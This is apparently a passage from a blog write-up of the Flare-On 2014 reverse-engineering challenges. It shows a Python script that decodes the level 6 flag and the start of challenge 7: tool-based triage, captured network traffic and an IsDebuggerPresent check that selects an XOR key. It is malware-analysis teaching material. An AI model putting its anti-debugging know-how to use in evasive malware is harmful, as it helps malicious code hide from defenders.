</span></span><span style=display:flex><span>    ((val <span style=color:#719e07>&amp;</span> (<span style=color:#2aa198>2</span><span style=color:#719e07>**</span>max_bits<span style=color:#719e07>-</span><span style=color:#2aa198>1</span>)) <span style=color:#719e07>&gt;&gt;</span> (max_bits<span style=color:#719e07>-</span>(r_bits<span style=color:#719e07>%</span>max_bits)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># Rotate right: 0b1001 --&gt; 0b1100</span>
</span></span><span style=display:flex><span>ror <span style=color:#719e07>=</span> <span style=color:#719e07>lambda</span> val, r_bits, max_bits<span style=color:#719e07>=</span><span style=color:#2aa198>8</span>: \
</span></span><span style=display:flex><span>    ((val <span style=color:#719e07>&amp;</span> (<span style=color:#2aa198>2</span><span style=color:#719e07>**</span>max_bits<span style=color:#719e07>-</span><span style=color:#2aa198>1</span>)) <span style=color:#719e07>&gt;&gt;</span> r_bits<span style=color:#719e07>%</span>max_bits) <span style=color:#719e07>|</span> \
</span></span><span style=display:flex><span>    (val <span style=color:#719e07>&lt;&lt;</span> (max_bits<span style=color:#719e07>-</span>(r_bits<span style=color:#719e07>%</span>max_bits)) <span style=color:#719e07>&amp;</span> (<span style=color:#2aa198>2</span><span style=color:#719e07>**</span>max_bits<span style=color:#719e07>-</span><span style=color:#2aa198>1</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2 <span style=color:#719e07>=</span> []
</span></span><span style=display:flex><span><span style=color:#719e07>for</span> x <span style=color:#719e07>in</span> <span style=color:#b58900>range</span>(<span style=color:#2aa198>32</span>):
</span></span><span style=display:flex><span>    arg2<span style=color:#719e07>.</span>insert(x, <span style=color:#2aa198>90</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>0</span>] <span style=color:#719e07>=</span> rol(<span style=color:#2aa198>0x1B</span>,<span style=color:#2aa198>0xF2</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>1</span>] <span style=color:#719e07>=</span> (<span style=color:#2aa198>0x40</span> <span style=color:#719e07>^</span> <span style=color:#2aa198>0xF2</span> <span style=color:#719e07>^</span> <span style=color:#2aa198>0xB3</span> <span style=color:#719e07>^</span> <span style=color:#2aa198>0x30</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>2</span>] <span style=color:#719e07>=</span> (<span style=color:#2aa198>0x1F</span> <span style=color:#719e07>^</span> <span style=color:#2aa198>0x71</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>3</span>] <span style=color:#719e07>=</span>  rol(<span style=color:#2aa198>0xB0</span> , <span style=color:#2aa198>0xBC</span>)  <span style=color:#719e07>-</span> <span style=color:#2aa198>0xA3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>4</span>] <span style=color:#719e07>=</span>  ( <span style=color:#2aa198>0xE8</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>0x79</span> )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>5</span>] <span style=color:#719e07>=</span> rol( <span style=color:#2aa198>0xf6</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>0x28</span> , <span style=color:#2aa198>0x82</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>6</span>] <span style=color:#719e07>=</span> rol( <span style=color:#2aa198>0x1f</span> <span style=color:#719e07>-</span> <span style=color:#2aa198>0x2c</span>, <span style=color:#2aa198>0x4d</span> ) <span style=color:#719e07>+</span> <span style=color:#2aa198>0xb0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>7</span>] <span style=color:#719e07>=</span> ror( rol(<span style=color:#2aa198>0xAF</span> <span style=color:#719e07>-</span> <span style=color:#2aa198>0x3F</span> , <span style=color:#2aa198>0x2A</span>) <span style=color:#719e07>^</span> <span style=color:#2aa198>0xb8</span> , <span style=color:#2aa198>0x99</span> ) <span style=color:#719e07>-</span> <span style=color:#2aa198>0x54</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>8</span>] <span style=color:#719e07>=</span> rol( <span style=color:#2aa198>0x5D</span> , <span style=color:#2aa198>0xBA</span> )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>9</span>] <span style=color:#719e07>=</span> rol(<span style=color:#2aa198>0x29</span> <span style=color:#719e07>-</span> <span style=color:#2aa198>0x30</span>,<span style=color:#2aa198>0x6C</span>) <span style=color:#719e07>^</span> <span style=color:#2aa198>0xED</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>10</span>] <span style=color:#719e07>=</span> <span style=color:#2aa198>0xb5</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>0xbf</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>11</span>] <span style=color:#719e07>=</span> ror(ror(<span style=color:#2aa198>0xa5</span> <span style=color:#719e07>-</span> <span style=color:#2aa198>0x63</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>0x31</span>,<span style=color:#2aa198>0x7b</span>) <span style=color:#719e07>-</span> <span style=color:#2aa198>0x8c</span> , <span style=color:#2aa198>0xbc</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>12</span>] <span style=color:#719e07>=</span> ror ( ror ( ror ( <span style=color:#2aa198>0xf3</span> , <span style=color:#2aa198>0x98</span>) <span style=color:#719e07>^</span> <span style=color:#2aa198>0xAE</span>, <span style=color:#2aa198>0x16</span>) , <span style=color:#2aa198>0x20</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>13</span>] <span style=color:#719e07>=</span> rol ( <span style=color:#2aa198>0xa6</span> <span style=color:#719e07>-</span> <span style=color:#2aa198>0xD2</span>  , <span style=color:#2aa198>0x6E</span> )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>14</span>] <span style=color:#719e07>=</span> <span style=color:#2aa198>0x62</span> <span style=color:#719e07>-</span> <span style=color:#2aa198>0x34</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>15</span>] <span style=color:#719e07>=</span> (<span style=color:#2aa198>0x32</span> <span style=color:#719e07>^</span> <span style=color:#2aa198>0xB2</span>) <span style=color:#719e07>-</span> <span style=color:#2aa198>0x62</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>0x10</span> <span style=color:#719e07>-</span> <span style=color:#2aa198>0xCD</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>16</span>] <span style=color:#719e07>=</span> rol ( <span style=color:#2aa198>0xEB</span> , <span style=color:#2aa198>0x07</span>) <span style=color:#719e07>^</span> <span style=color:#2aa198>0x73</span> <span style=color:#719e07>^</span> <span style=color:#2aa198>0xB7</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>17</span>] <span style=color:#719e07>=</span> rol ( <span style=color:#2aa198>0x0B</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>0x4C</span> <span style=color:#719e07>-</span> <span style=color:#2aa198>0x5B</span> , <span style=color:#2aa198>0x36</span> ) <span style=color:#719e07>+</span> <span style=color:#2aa198>0x61</span> <span style=color:#719e07>-</span> <span style=color:#2aa198>0x34</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>18</span>] <span style=color:#719e07>=</span> <span style=color:#2aa198>0x9A</span> <span style=color:#719e07>-</span> <span style=color:#2aa198>0x5A</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>19</span>] <span style=color:#719e07>=</span> rol(<span style=color:#2aa198>0x99</span>, <span style=color:#2aa198>0xa2</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>20</span>] <span style=color:#719e07>=</span> (<span style=color:#2aa198>0x2B</span> <span style=color:#719e07>+</span> <span style=color:#2aa198>0xE7</span>) <span style=color:#719e07>^</span> <span style=color:#2aa198>0x7E</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>arg2[<span style=color:#2aa198>21</span>] <span style=color:#719e07>=</span> ( ( rol( ror(<span style=color:#2aa198>0xAF</span>,<span style=color:#2aa198>0x57</span>) , <span style=color:#2aa198>0x4A</span>) <span style=color:#719e07>-</span> <span style=color:#2aa198>0x4E</span> ) <span style=color:#719e07>^</span> <span style=color:#2aa198>0x86</span> ) <span style=color:#719e07>+</span> <span style=color:#2aa198>0xb8</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># stopped after @fla</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#719e07>for</span> index, item <span style=color:#719e07>in</span> <span style=color:#b58900>enumerate</span>(arg2):
</span></span><span style=display:flex><span>    arg2[index] <span style=color:#719e07>=</span> item <span style=color:#719e07>&amp;</span> <span style=color:#2aa198>0xFF</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#b58900>print</span> <span style=color:#2aa198>&#39;&#39;</span><span style=color:#719e07>.</span>join(<span style=color:#b58900>map</span>(<span style=color:#b58900>chr</span>, arg2))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#586e75># output</span>
</span></span><span style=display:flex><span>l1nhax<span style=color:#719e07>.</span>hurt<span style=color:#719e07>.</span>u5<span style=color:#719e07>.</span>a1l<span style=color:#268bd2>@flaZZZZZZZZZZ</span></span></span></code></pre></td></tr></table></div></div></div></figure><p>Thanks <a href=https://twitter.com/Wartortell target=_blank rel="noreferrer noopener">@Wartortell</a>.</p><h4 id=level-6-flag>Level 6 flag: <a href=mailto:l1nhax.hurt.u5.a1l@flare-on.com>l1nhax.hurt.u5.a1l@flare-on.com</a>
<a class=header-link href=#level-6-flag><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><hr><h2 id=challenge-7---the-doge-strikes-back><a name=ch7></a>Challenge 7 - The Doge Strikes Back
<a class=header-link href=#challenge-7---the-doge-strikes-back><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><pre tabindex=0><code>Alright! Last one, can you get to the finish line? Keep it up!
-FLARE
</code></pre><p>By this time we have already fallen into a pre-check routine. Filename is <code>d69650fa6d4825ec2ddeecdc6a92228d</code> (MD5 hash) and googling brings up no notable results.</p><p>PE-Studio stuff:</p><ul><li>Win32 executable</li><li>VirusTotal score: 5 / 55</li><li>Imported libraries: ws2_32.dll, kernel32.dll and wininet.dll. <code>wininet.dll</code> is for the interwebz</li><li>Imported symbols: Lots of them. Functions for creating network sockets, hostname lookups, creating, reading and writing files and general anti-debug/anti-vm stuff</li><li>Strings: Not as many strings as challenge 6. cmd.exe and 127.0.0.1 look interesting</li></ul><p>I used <code>API Monitor</code> to observe application's API calls. It crashed after a while and API Monitor flagged 230k calls. Sifting through them is not practical but a lot of them are redundant and do not look interesting. For example there are a lot of <code>LocalAlloc</code> and <code>LocalFree</code> calls. Right click any call and select <code>Exclude > API Name</code> to filter it. After excluding a lot of stuff, there was still so much crap. So instead I tried to look at API calls to certain Dlls for example <code>wininet.dll</code>. Under <code>Monitored Processes</code> navigate to <code>Modules</code> and then select a specific Dll to only see its calls. Let's search for specific calls that we noticed in PE-Studio. API Monitor also supports searching in MSDN. Double click a call or right click and select <code>Online Help (MSDN)</code>.</p><p>I searched for <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx" target=_blank rel="noreferrer noopener">gethostbyname</a> and found some interesting results:</p><p><img src=/images/2014/flare/7-1.jpg alt=Dogecoin title=Dogecoin></p><figure class=code><figcaption><span>Calls for gethostbyname</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>gethostbyname ( <span style=color:#2aa198>&#34;www.dogecoin.com&#34;</span> )
</span></span><span style=display:flex><span>gethostbyname ( <span style=color:#2aa198>&#34;e.root-servers.net&#34;</span> )</span></span></code></pre></td></tr></table></div></div></div></figure><p>I was curious about these connections so I captured the traffic using <code>Wireshark</code> from launch to crash.</p><figure class=code><figcaption><span>Traffic summary - some lines omitted</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#2aa198>10.0</span>.2.15	<span style=color:#2aa198>192.168</span>.1.1	DNS	<span style=color:#2aa198>76</span>	Standard query 0xbbc7  A www.dogecoin.com
</span></span><span style=display:flex><span><span style=color:#2aa198>192.168</span>.1.1	<span style=color:#2aa198>10.0</span>.2.15	DNS	<span style=color:#2aa198>106</span>	Standard query response 0xbbc7  CNAME dogecoin.com A <span style=color:#2aa198>204.232</span>.175.78
</span></span><span style=display:flex><span><span style=color:#2aa198>10.0</span>.2.15	<span style=color:#2aa198>192.168</span>.1.1	DNS	<span style=color:#2aa198>78</span>	Standard query 0xa75d  A e.<span style=color:#b58900>root-servers</span>.net
</span></span><span style=display:flex><span><span style=color:#2aa198>192.168</span>.1.1	<span style=color:#2aa198>10.0</span>.2.15	DNS	<span style=color:#2aa198>94</span>	Standard query response 0xa75d  A <span style=color:#2aa198>192.203</span>.230.10
</span></span><span style=display:flex><span><span style=color:#2aa198>10.0</span>.2.15	<span style=color:#2aa198>192.168</span>.1.1	DNS	<span style=color:#2aa198>71</span>	Standard query 0x7524  A twitter.com
</span></span><span style=display:flex><span><span style=color:#2aa198>192.168</span>.1.1	<span style=color:#2aa198>10.0</span>.2.15	DNS	<span style=color:#2aa198>135</span>	Standard query response 0x7524  A <span style=color:#2aa198>199.16</span>.156.198 A <span style=color:#2aa198>199.16</span>.156.70 A <span style=color:#2aa198>199.16</span>.156.6 A <span style=color:#2aa198>199.16</span>.156.102
</span></span><span style=display:flex><span><span style=color:#2aa198>10.0</span>.2.15	<span style=color:#2aa198>199.16</span>.156.198	TLSv1	<span style=color:#2aa198>124</span>	Client Hello
</span></span><span style=display:flex><span><span style=color:#2aa198>199.16</span>.156.198	<span style=color:#2aa198>10.0</span>.2.15	TLSv1	<span style=color:#2aa198>1474</span>	Server Hello
</span></span><span style=display:flex><span><span style=color:#2aa198>199.16</span>.156.198	<span style=color:#2aa198>10.0</span>.2.15	TLSv1	<span style=color:#2aa198>382</span>	Certificate
</span></span><span style=display:flex><span><span style=color:#2aa198>10.0</span>.2.15	<span style=color:#2aa198>199.16</span>.156.198	TLSv1	<span style=color:#2aa198>368</span>	Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message
</span></span><span style=display:flex><span><span style=color:#2aa198>199.16</span>.156.198	<span style=color:#2aa198>10.0</span>.2.15	TLSv1	<span style=color:#2aa198>101</span>	Change Cipher Spec, Encrypted Handshake Message
</span></span><span style=display:flex><span><span style=color:#2aa198>10.0</span>.2.15	<span style=color:#2aa198>199.16</span>.156.198	TLSv1	<span style=color:#2aa198>260</span>	Application Data
</span></span><span style=display:flex><span><span style=color:#2aa198>199.16</span>.156.198	<span style=color:#2aa198>10.0</span>.2.15	TLSv1	<span style=color:#2aa198>1431</span>	Application Data
</span></span><span style=display:flex><span><span style=color:#2aa198>199.16</span>.156.198	<span style=color:#2aa198>10.0</span>.2.15	TLSv1	<span style=color:#2aa198>1474</span>	Application Data</span></span></code></pre></td></tr></table></div></div></div></figure><p>Query for <code>www.dogecoin.com</code>, <code>e.root-servers.net</code> and <code>www.twitter.com</code>. Then TLS handshake in lines 7-11 and finally a request to twitter (line 12) and reply (lines 13-14). Let's search for "twitter" in API Monitor and we see this <code>InternetOpenUrlW ( 0x00cc0004, "https://twitter.com/FireEye/status/484033515538116608", NULL, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_PRAGMA_NOCACHE, 0 )</code>. Let's find that tweet and it looks normal.</p><p><img src=/images/2014/flare/7-2.jpg alt="When embed tweet plugins for Octopress don't work" title="When embed tweet plugins for Octopress don't work"></p><p>Because this challenge employs a good number of Anti-Debug/Anti-VM protections, I will try to explain what I learned at each stage. Even after finishing the challenge I went back and looked at some steps again to learn more.</p><p>Here are some useful resources:</p><ul><li><p><a href=http://pferrie.host22.com/papers/antidebug.pdf target=_blank rel="noreferrer noopener">The "Ultimate" Anti-Debugging Reference (PDF)</a> by <code>Peter Ferrie</code>. I had to remind myself what year it was after I visited <a href=http://pferrie.host22.com/ target=_blank rel="noreferrer noopener">his website</a></p></li><li><p><a href=http://practicalmalwareanalysis.com/ target=_blank rel="noreferrer noopener">Practical Malware Analysis book</a> chapters 16 and 17 deal with Anti-Debugging and Anti-VM techniques</p></li><li><p><a href=https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/ target=_blank rel="noreferrer noopener">Five Anti-Analysis Tricks That Sometimes Fool Analysts</a> was published when I was writing this post</p></li></ul><p>Find <code>main</code> and put a breakpoint on it. As we go through main we reach a bunch of function calls. Let's start with the first one.</p><h4 id=function-1---isdebuggerpresent>Function 1 - isDebuggerPresent?
<a class=header-link href=#function-1---isdebuggerpresent><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span>.text:00401<span style=color:#268bd2>B13</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401030</span>   <span style=color:#586e75>; you are here</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B18</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4010C0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B1D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401130</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B22</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4011D0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B27</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4012A0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B2C</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401350</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B31</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4013F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B36</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401460</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3B</span> <span style=color:#268bd2>mov</span>     <span style=color:#b58900>eax</span>, [<span style=color:#b58900>esi</span>]
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B3D</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4014F0</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B42</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_401590</span>
</span></span><span style=display:flex><span>.text:00401<span style=color:#268bd2>B47</span> <span style=color:#268bd2>call</span>    <span style=color:#268bd2>sub_4016F0</span></span></span></code></pre></td></tr></table></div></div></div></figure><p><img src=/images/2014/flare/7-3.jpg alt=isDebuggerPresent title=isDebuggerPresent></p><p>The result of a function call <code>isDebuggerPresent</code> is compared with 0 by <code>test eax, eax</code>. This function will return 1 if the application is being debugged. In our case it will return 1 and the jump fails. Before the compare we see a value <code>0x106240</code> or <code>1073728</code> is loaded into <code>esi</code>. On both sides we see a string being loaded and then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing <code>oh happy dayz</code> with the data at <code>byte_4131F8</code>. If we reach the end of the string it will restart from the first character. This loop will go on for <code>1073728</code> bytes which seems to be length of data starting at <code>byte_4131F8</code>. I am going to rename it to <code>blob</code> and the number <code>0x106240</code> to <code>blob_length</code>.</p><p>If debugger is present, we go left and the string <code>oh happy dayz</code> is xor-ed with the blob. If no debugger is present, we jump to the right branch and string <code>the final countdown</code> is xor-ed with the <code>blob</code>.</p><figure class=code><figcaption><span>isDebuggerPresent</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>if</span> (isDebuggerPresent):
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;oh happy dayz&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#719e07>else</span>:
</span></span><span style=display:flex><span>    blob <span style=color:#719e07>=</span> xor(blob,<span style=color:#2aa198>&#34;the final countdown&#34;</span>)</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=function-2---beingdebugged>Function 2 - BeingDebugged?
<a class=header-link href=#function-2---beingdebugged><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><figure class=code><figcaption><span></span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
